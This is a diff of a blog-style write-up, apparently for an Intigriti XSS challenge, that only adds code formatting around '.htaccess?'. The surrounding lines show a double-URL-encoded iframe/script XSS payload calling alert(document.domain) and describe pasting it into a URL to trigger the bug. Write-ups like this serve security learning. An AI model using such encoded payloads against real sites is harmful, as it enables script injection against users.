@@ -135,7 +135,7 @@ php > echo rawurlencode(rawurlencode('<iframe srcdoc="<script src=/\';alert(docu
 %253Ciframe%2520srcdoc%253D%2522%253Cscript%2520src%253D%252F%2527%253Balert%2528document.domain%2529%253B%2527%253E%253C%252Fscript%253E%2522%253E%253C%252Fiframe%253E
 ```
 	
-Crossing my fingers I pasted this URL encoded string after the .htaccess? in the URL, and voilà:
+Crossing my fingers I pasted this URL encoded string after the `.htaccess?` in the URL, and voilà:
 
 ![Successful XSS]({{ 'assets/intigriti-success.png' | relative_url }})
 
